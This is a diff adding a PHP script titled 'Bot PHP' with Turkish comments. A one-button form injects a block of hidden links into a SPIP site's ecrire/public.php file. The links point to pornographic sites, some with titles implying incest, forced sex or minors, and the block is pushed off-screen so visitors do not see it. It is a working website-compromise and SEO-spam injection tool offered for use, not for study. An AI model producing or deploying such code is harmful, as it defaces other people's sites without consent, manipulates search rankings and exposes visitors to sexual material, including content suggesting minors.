@@ -1,0 +1,64 @@
+<?php
+
+// Backlink ekleme işlemi
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Eklenecek backlink kodu
+    $backlinkCode = '<span style="position: absolute; left: -8355px;">
+<a href="https://ar.bestporn2025.com/video/2021-أفضل-تجميع-إباحي-fortnite---يمارس-الجنس-مع-عاهرات-ثلاثية-الأبعاد-في-المؤخرة-والفرج-والحلق-98.html" target="_blank">فورت نايت جنس بورنو مجاني للنساء</a><br>
+<a href="https://bn.xnxxporns.com/search/পিতা+কন্যা+জোরপূর্বক+যৌনতা/" target="_blank">বাবা মেয়ের সেক্স ভিডিও best twitter porn accounts</a><br>
+<a href="https://bn.bigassmonster.com/video/কুমারী-ভক্তকে-চুদছে-মিয়া-খলিফা-2504.html" target="_blank">মিয়া খলিফা শীর্ষ বিনামূল্যে পর্ন সাইট</a><br>
+<a href="https://de.xvix.eu/search/pornofilm/" target="_blank">Pornofilme in voller Länge</a><br>
+<a href="https://zgays.com/video/my-horny-boyfriend-rough-fucked-my-ass-in-the-toilet-2598.html" target="_blank">public sex qith honrny boyfriend that sucks and fuck in the toilet room</a><br>
+<a href="https://no.only-brunettes.com/video/😎-et-sexy,-sexy-og-amatørpar-kler-seg-av-og-forfører-hverandre-i-en-finsk-badstue-for-til-slutt-å-knulle-sensuelt-for-en-orgasme.-1713.html" target="_blank">yada! vi fant en annen offentlig badstue å knulle i! første gang sex porno video</a><br>
+<a href="https://th.teensexonline.com/video/สาวผมบลอนด์น่ารักคนนี้จับได้ว่าฉันกำลังช่วยตัวเองอยู่ในรถและช่วยฉันด้วย-สาวผมบลอนด์น่ารักคนนี้กระตุกไก่ของฉันจนน้ำแตก-1898.html" target="_blank">ช่วยตัวเองในรถบนเว็บไซต์หาคู่ฟรีที่ดีที่สุด</a><br>
+<a href="https://vi.onlyteens.porn/video/những-nữ-sinh-châu-á-gợi-cảm-này-có-tình-dục-đồng-tính-nữ-mãnh-liệt-2004.html" target="_blank">phim sex đồng tính nữ mà bạn cũng có các trang web hẹn hò dành cho người cao tuổi</a><br>
+<a href="https://vi.porn2026.com/video/thí-nghiệm-xã-hội-với-sinh-viên-để-tôi-trả-tiền-cho-cô-ấy-để-đụ-cô-ấy-ngoài-trời.-200.html" target="_blank">thí nghiệm xã hội sex với sex hẹn hò tốt nhất dành cho nam giới</a><br>
+<a href="https://zh.djav.org/video/这个好色的男孩等着他火辣的姐姐回家，然后他走近她并操纵她让他操她的阴户。-4386.html" target="_blank">最佳免费色情网站上的色情动漫</a><br>
+
+
+
+</span>' . PHP_EOL;
+
+    // Ecrire klasörünün yolu
+    $ecrireDir = __DIR__ . DIRECTORY_SEPARATOR . 'ecrire';
+
+    // public.php dosyasının yolu
+    $publicFilePath = $ecrireDir . DIRECTORY_SEPARATOR . 'public.php';
+
+    // public.php dosyasını kontrol ve düzenleme işlemi
+    if (file_exists($publicFilePath)) {
+        // Dosya içeriğini oku
+        $fileContents = file_get_contents($publicFilePath);
+
+        // Backlink zaten var mı kontrol et
+        if (strpos($fileContents, $backlinkCode) === false) {
+            // Backlinki dosyanın en üstüne ekle
+            $newContents = $backlinkCode . $fileContents;
+
+            // Dosyayı yeni içerikle yaz
+            if (file_put_contents($publicFilePath, $newContents)) {
+                echo "Backlink başarıyla eklendi: $publicFilePath\n";
+            } else {
+                echo "Dosyaya yazma hatası: $publicFilePath\n";
+            }
+        } else {
+            echo "Backlink zaten mevcut: $publicFilePath\n";
+        }
+    } else {
+        echo "public.php dosyası bulunamadı: $publicFilePath\n";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bot PHP</title>
+</head>
+<body>
+    <form method="post">
+        <button type="submit">EKLE</button>
+    </form>
+</body>
+</html>
